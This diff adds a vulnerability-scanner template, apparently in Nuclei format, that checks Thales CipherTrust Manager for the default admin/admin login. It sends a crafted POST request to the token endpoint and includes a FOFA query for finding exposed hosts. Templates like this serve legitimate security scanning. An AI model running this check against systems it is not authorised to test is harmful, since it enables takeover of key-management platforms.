@@ -1,0 +1,40 @@
+id: ciphertrust-default-login
+
+info:
+  name: Ciphertrust - Default Login
+  author: SleepingBag945
+  severity: high
+  description: |
+    Attackers can control the entire platform through the default password （initpass） vulnerability, and use administrator privileges to operate core functions.
+  reference:
+    - https://www.thalesdocs.com/ctp/cm/2.6/get_started/deployment/initial-password/index.html#:~:text=The%20username%20of%20the%20initial,to%20%22admin%22%20in%20lowercase.
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: cert="Ciphertrust" || fid="yHV5+ZZGMu0="
+  tags: default-login,ciphertrust
+
+http:
+  - raw:
+      - |
+        POST /api/v1/auth/tokens/  HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{username}}","connection":"local_account","password":"{{password}}","grant_type":"password","refresh_token_revoke_unused_in":30,"cookies":true,"labels":["web-ui"]}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+    host-redirects: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 401'
+          - 'contains(body_1,"code") && contains(body_1,"message\":\"Password change required")'
+        condition: and
+
+# digest: 4a0a0047304502202425a121f10e60aa6b3a7e2c775ed6f4963d39b0e10df200a44c9ff2e7c5114c022100b97629586dc575da8f1710bed744b4f21b298fd33afe1d9ee2881224f5c69f76:922c64590222798bb761d5b6d8e72950
